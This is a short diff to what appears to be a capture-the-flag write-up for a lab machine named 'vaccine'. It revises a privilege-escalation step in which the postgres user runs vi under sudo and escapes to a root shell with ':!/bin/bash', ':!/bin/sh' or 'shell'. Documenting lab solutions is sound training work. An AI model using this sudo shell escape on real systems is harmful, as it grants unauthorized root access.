@@ -163,9 +163,17 @@ User postgres may run the following commands on vaccine:
 
 > sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
 
-- Input commend in *sudo vi* to get root privilege
+- Input commend in *sudo vi* to generate a root shell
 
-> :!/bin/bash -P
+> :!/bin/bash
+
+or
+
+> :!/bin/sh
+
+or
+
+> shell
 
 ## Finally
 
